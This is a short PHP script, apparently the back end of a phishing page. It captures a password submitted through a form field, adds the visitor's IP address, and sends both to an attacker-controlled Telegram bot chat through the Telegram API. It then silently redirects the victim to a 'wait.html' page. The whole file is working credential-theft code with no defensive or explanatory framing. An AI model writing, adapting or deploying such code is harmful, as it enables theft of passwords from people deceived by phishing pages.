<?php
$ip = getenv("REMOTE_ADDR");
$message .= "---------------------------------------------------\n";
$message .= "Password   : ".$_POST['code']."\n";
$message .= "-------------------\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------------------------------------------\n";
$token = "<TOKEN_REMOVED>";
$data = [
    'text' => $message,
    'chat_id' => '5723610400'
];

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
echo '<script language="Javascript">
<!--
document.location.replace("wait.html");
// -->
</script>';


?>
